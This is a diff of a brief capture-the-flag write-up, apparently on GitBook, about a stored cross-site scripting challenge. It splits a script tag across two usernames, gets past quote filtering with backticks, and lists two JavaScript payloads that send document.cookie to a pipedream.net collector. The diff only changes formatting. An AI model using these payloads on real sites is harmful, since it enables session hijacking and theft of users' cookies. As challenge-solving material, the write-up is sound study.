@@ -2,13 +2,13 @@
 
 First, Register and login
 
-Edit username: **\*/&lt;/script** and send cc notepad
+Edit username: **\*/\</script** and send cc notepad
 
-Edit username: **&lt;script&gt;/\*** 
+Edit username: **\<script>/\* **
 
 Host a sever pipedream and send request
 
-Note: **' , "** filted so we use \`
+Note:** ' , "** filted so we use \`
 
 ```javascript
 payload = */fetch(`https://enz92o3d70fhjpm.m.pipedream.net?c=`+document.cookie)/*
@@ -18,11 +18,10 @@ payload = */fetch(`https://enz92o3d70fhjpm.m.pipedream.net?c=`+document.cookie)/
 payload = */ new Image().src=`https://enz92o3d70fhjpm.m.pipedream.net?c=`+document.cookie /*
 ```
 
-![](../.gitbook/assets/image%20%2853%29.png)
+![](<../.gitbook/assets/image (53).png>)
 
 ## Set cookie
 
-![](../.gitbook/assets/image%20%2852%29.png)
+![](<../.gitbook/assets/image (52).png>)
 
-![](../.gitbook/assets/image%20%2851%29.png)
-
+![](<../.gitbook/assets/image (51).png>)
